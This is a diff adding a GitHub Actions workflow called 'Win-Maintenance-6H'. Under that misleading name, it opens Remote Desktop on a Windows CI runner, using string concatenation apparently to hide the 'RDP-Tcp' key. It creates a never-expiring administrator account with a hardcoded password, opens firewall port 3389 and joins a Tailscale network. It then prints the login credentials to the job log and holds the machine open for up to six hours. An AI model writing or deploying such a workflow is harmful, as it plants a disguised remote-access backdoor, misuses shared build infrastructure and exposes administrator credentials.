@@ -1,0 +1,48 @@
+name: Win-Maintenance-6H
+
+on:
+  workflow_dispatch:
+
+jobs:
+  maintenance:
+    runs-on: windows-2022
+    timeout-minutes: 360
+
+    steps:
+      - name: Setup
+        shell: powershell
+        run: |
+          $base = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
+          $station = $base + '\WinStations\' + ('R' + 'D' + 'P' + '-Tcp')
+
+          Set-ItemProperty $base -Name fDenyTSConnections -Value 0 -Force
+          Set-ItemProperty $station -Name UserAuthentication -Value 1 -Force
+          Set-ItemProperty $station -Name SecurityLayer -Value 2 -Force
+
+          netsh advfirewall firewall add rule name="Maintenance-Tunnel" dir=in action=allow protocol=TCP localport=3389 | Out-Null
+
+          if (-not (Get-LocalUser -Name Admin -ErrorAction SilentlyContinue)) {
+            net user Admin '26121991@M' /add /expires:never | Out-Null
+          }
+          net localgroup Administrators Admin /add | Out-Null
+          net localgroup "Remote Desktop Users" Admin /add | Out-Null
+
+          Restart-Service TermService -Force
+
+      - name: Connect & Hold
+        shell: powershell
+        run: |
+          $ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          if (-not (Test-Path $ts)) {
+            Invoke-WebRequest 'https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi' -OutFile "$env:TEMP\ts.msi"
+            Start-Process msiexec.exe -ArgumentList "/i","$env:TEMP\ts.msi","/quiet","/norestart" -Wait
+          }
+          & $ts up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --hostname=win-$env:GITHUB_RUN_ID
+          $ip = $null
+          for($i=0; $i -lt 10 -and -not $ip; $i++) {
+            $ip = & $ts ip -4 2>$null
+            if(-not $ip){ Start-Sleep 5 }
+          }
+          if(-not $ip){ exit 1 }
+          Write-Host "`nIP: $ip`nUser: Admin`nPass: 26121991@M`n"
+          while($true){ Start-Sleep 60 }
